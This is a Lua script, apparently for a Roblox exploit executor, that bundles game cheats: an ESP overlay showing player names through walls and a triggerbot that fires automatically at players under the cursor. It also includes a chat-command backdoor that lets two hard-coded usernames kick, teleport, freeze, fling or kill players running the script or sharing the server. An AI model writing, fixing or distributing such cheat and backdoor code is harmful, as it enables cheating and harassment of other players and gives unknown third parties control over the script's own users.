-- ðŸ”´ Fixed: ESP, Triggerbot, and VIP Commands (TextChatService-compatible)
-- Put this in a LocalScript

-- Services
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local TextChatService = game:GetService("TextChatService") -- may exist in modern experiences
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

-- Settings / state
local VIPUsers = { "afasterpl11", "misiuperc568" }
local BringTargets = {}
local FrozenPlayers = {}
local targetedPlayers = {}   -- keyed by player.Name (string)
local espObjects = {}        -- keyed by Player object -> {Gui, RenderConn, CharConn}
local lastTargetedPlayerName = nil

-- -------------------------
-- VIP utility functions
-- -------------------------
local function teleportToPlayer(targetName)
    local targetPlayer = Players:FindFirstChild(targetName)
    local myChar = LocalPlayer.Character
    if targetPlayer and targetPlayer.Character and myChar then
        local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
        local myRoot = myChar:FindFirstChild("HumanoidRootPart")
        if targetRoot and myRoot then
            myRoot.CFrame = targetRoot.CFrame + Vector3.new(0,3,0)
        end
    end
end

local function freezeAllPlayers(senderName)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and player.Name ~= senderName and not FrozenPlayers[player.Name] then
            local root = player.Character:FindFirstChild("HumanoidRootPart")
            if root then
                root.Anchored = true
                FrozenPlayers[player.Name] = true
            end
        end
    end
end

local function unfreezeAllPlayers(senderName)
    for name, _ in pairs(FrozenPlayers) do
        if name ~= senderName then
            local player = Players:FindFirstChild(name)
            if player and player.Character then
                local root = player.Character:FindFirstChild("HumanoidRootPart")
                if root then
                    root.Anchored = false
                end
            end
            FrozenPlayers[name] = nil
        end
    end
end

local function killAllOtherPlayers(senderName)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name ~= senderName then
            local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
            if hum then
                hum.Health = 0
            end
        end
    end
end

local function flingPlayer(player)
    if player.Character then
        local root = player.Character:FindFirstChild("HumanoidRootPart")
        if root then
            local bv = Instance.new("BodyVelocity")
            bv.Velocity = Vector3.new(math.random(-1500,1500), 800, math.random(-1500,1500))
            bv.MaxForce = Vector3.new(1e6,1e6,1e6)
            bv.P = 1e5
            bv.Parent = root
            task.delay(0.3, function() bv:Destroy() end)
        end
    end
end

-- -------------------------
-- ESP functions (robust)
-- -------------------------
local function cleanupESPObjectForPlayer(player)
    local data = espObjects[player]
    if not data then return end
    if data.RenderConn then data.RenderConn:Disconnect() end
    if data.CharConn then data.CharConn:Disconnect() end
    if data.Gui and data.Gui.Parent then data.Gui:Destroy() end
    espObjects[player] = nil
end

local function addESP(targetPlayer, color)
    if not targetPlayer or espObjects[targetPlayer] then return end

    -- Create GUI once
    local gui = Instance.new("BillboardGui")
    gui.Name = "ESP_NameTag"
    gui.Size = UDim2.new(0, 110, 0, 24)
    gui.StudsOffset = Vector3.new(0, 2.25, 0)
    gui.AlwaysOnTop = true
    -- parent to CoreGui or PlayerGui depending on your environment
    -- CoreGui is commonly used for local utilities; PlayerGui would also work
    gui.Parent = game:GetService("CoreGui")

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = color or Color3.fromRGB(255,255,255)
    label.TextStrokeTransparency = 0.8
    label.TextStrokeColor3 = Color3.fromRGB(0,0,0)
    label.TextScaled = true
    label.Font = Enum.Font.SourceSansBold
    label.Text = targetPlayer.Name
    label.Parent = gui

    espObjects[targetPlayer] = { Gui = gui, Player = targetPlayer }

    -- RenderStepped attaches Adornee to the head if present (non-blocking)
    local renderConn = RunService.RenderStepped:Connect(function()
        if not espObjects[targetPlayer] then return end -- safety if removed mid-frame
        local char = targetPlayer.Character
        if char then
            local head = char:FindFirstChild("Head")
            gui.Adornee = head
        else
            gui.Adornee = nil
        end
    end)
    espObjects[targetPlayer].RenderConn = renderConn

    -- Also attach to CharacterAdded to ensure quick attach when they spawn
    local charConn = targetPlayer.CharacterAdded:Connect(function(char)
        -- wait short time for head to appear (non-blocking since in separate thread)
        local head = char:WaitForChild("Head", 5)
        if head and espObjects[targetPlayer] and espObjects[targetPlayer].Gui then
            espObjects[targetPlayer].Gui.Adornee = head
        end
    end)
    espObjects[targetPlayer].CharConn = charConn
end

local function removeESP(targetPlayer)
    if not targetPlayer then return end
    cleanupESPObjectForPlayer(targetPlayer)
end

local function getColorForPlayer(player)
    return Color3.fromRGB(255,255,255)
end

-- -------------------------
-- Triggerbot (unchanged)
-- -------------------------
local TriggerBot = { Enabled=false, Connections={}, BlacklistCache = {} }
TriggerBot.Settings = { Keybind = Enum.KeyCode.Q, Prediction = 0.01, Blacklisted = {"Knife"} }
for _, itemName in ipairs(TriggerBot.Settings.Blacklisted) do
    TriggerBot.BlacklistCache[itemName:lower()] = true
end

local function IsToolBlacklisted(tool)
    return tool and TriggerBot.BlacklistCache[tool.Name:lower()]
end

local function IsValidTarget(player)
    if not player or player == LocalPlayer then return false end
    local char = player.Character
    if not char then return false end
    local be = char:FindFirstChild("BodyEffects")
    if be then
        local ko = be:FindFirstChild("K.O") or be:FindFirstChild("KO")
        if ko and ko.Value then return false end
    end
    local hum = char:FindFirstChild("Humanoid")
    if hum and hum.Health <= 0 then return false end
    return true
end

local function GetTargetFromMouse()
    local target = Mouse.Target
    if not target then return nil end
    for _,player in ipairs(Players:GetPlayers()) do
        if player.Character and target:IsDescendantOf(player.Character) and IsValidTarget(player) then
            return player, target
        end
    end
    return nil
end

local function GetEquippedTool()
    local char = LocalPlayer.Character
    if not char then return nil end
    for _, tool in ipairs(char:GetChildren()) do
        if tool:IsA("Tool") and not IsToolBlacklisted(tool) then
            return tool
        end
    end
    return nil
end

local function ExecuteTrigger()
    if not TriggerBot.Enabled then return end
    local targetPlayer,_ = GetTargetFromMouse()
    if not targetPlayer then return end
    local tool = GetEquippedTool()
    if not tool then return end
    if TriggerBot.Settings.Prediction > 0 then task.wait(TriggerBot.Settings.Prediction) end
    tool:Activate()
end

function TriggerBot:Toggle(state)
    if state ~= nil then self.Enabled = state else self.Enabled = not self.Enabled end
end

TriggerBot.Connections.InputBegan = UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == TriggerBot.Settings.Keybind then
        TriggerBot:Toggle()
    end
end)
TriggerBot.Connections.RenderStepped = RunService.RenderStepped:Connect(ExecuteTrigger)

getgenv().DisableTriggerBot = function()
    for _, conn in pairs(TriggerBot.Connections) do
        conn:Disconnect()
    end
    TriggerBot.Enabled = false
end

-- -------------------------
-- Chat command handler (same logic, but we ensure addESP runs locally)
-- -------------------------
local function onMessage(senderName, message)
    if not senderName or not message then return end

    local isVIP = false
    for _, vipName in ipairs(VIPUsers) do
        if senderName:lower() == vipName:lower() then
            isVIP = true
            break
        end
    end
    if not isVIP then return end

    local args = message:split(" ")
    local command = args[1] and args[1]:lower() or ""

    if command == ".h" then
        local targetName = args[2]
        if targetName then
            -- case-insensitive lookup for players
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Name:lower() == targetName:lower() then
                    if not targetedPlayers[p.Name] then
                        targetedPlayers[p.Name] = true
                        lastTargetedPlayerName = p.Name
                        -- ensure ESP is created on YOUR client
                        addESP(p, getColorForPlayer(p))
                    end
                end
            end
        end

    elseif command == ".j" then
        -- clear all ESPs locally
        for name, _ in pairs(targetedPlayers) do
            local target = Players:FindFirstChild(name)
            if target then removeESP(target) end
            targetedPlayers[name] = nil
        end
        lastTargetedPlayerName = nil

    elseif command == ".k" and LocalPlayer.Name:lower() ~= senderName:lower() then
        LocalPlayer:Kick("Kicked by VIP")
    elseif command == ".g" then
        if LocalPlayer.Name ~= senderName then BringTargets[LocalPlayer.Name] = true end
    elseif command == ".s" then
        BringTargets[LocalPlayer.Name] = nil
    elseif command == ".f" then
        freezeAllPlayers(senderName)
    elseif command == ".u" then
        unfreezeAllPlayers(senderName)
    elseif command == ".tp" and args[2] then
        if LocalPlayer.Name ~= senderName then teleportToPlayer(args[2]) end
    elseif command == ".fling" then
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Name ~= senderName then flingPlayer(p) end
        end
    elseif command == ".r" then
        if LocalPlayer.Name ~= senderName then killAllOtherPlayers(senderName) end
    end
end

-- -------------------------
-- Chat hooking: TextChatService (new) + fallback Player.Chatted (legacy)
-- -------------------------

-- 1) Legacy: hook Player.Chatted for compatibility (still works in many places)
local function hookPlayerChatted(plr)
    if plr and plr.Chatted then
        plr.Chatted:Connect(function(msg)
            -- 'plr.Name' is the sender name in legacy chat
            onMessage(plr.Name, msg)
        end)
    end
end
for _, p in ipairs(Players:GetPlayers()) do hookPlayerChatted(p) end
Players.PlayerAdded:Connect(hookPlayerChatted)

-- 2) Modern: use TextChatService.OnIncomingMessage (client-only callback)
-- This ensures we catch messages from the new chat system.
if TextChatService then
    -- assign callback (TextChatService expects a client-side callback here)
    -- The callback receives a TextChatMessage object with .Text and .TextSource.UserId
    TextChatService.OnIncomingMessage = function(textChatMessage)
        if not textChatMessage then return end

        local text = textChatMessage.Text or ""
        if text == "" then return end

        -- Try to resolve sender name from TextSource.UserId (preferred)
        local senderName = nil
        local ok, userId = pcall(function()
            return (textChatMessage.TextSource and textChatMessage.TextSource.UserId) or 0
        end)

        if ok and userId and userId > 0 then
            local success, name = pcall(function()
                return Players:GetNameFromUserIdAsync(userId)
            end)
            if success and name then
                senderName = name
            end
        end

        -- Fallbacks if UserId not available
        if not senderName then
            senderName = (textChatMessage.TextSource and textChatMessage.TextSource.Name) or textChatMessage.FromSpeaker or ""
        end

        if senderName ~= "" then
            onMessage(senderName, text)
        end
    end
end

-- Clean up ESP when players leave
Players.PlayerRemoving:Connect(function(plr)
    if targetedPlayers[plr.Name] then targetedPlayers[plr.Name] = nil end
    removeESP(plr)
end)

-- done
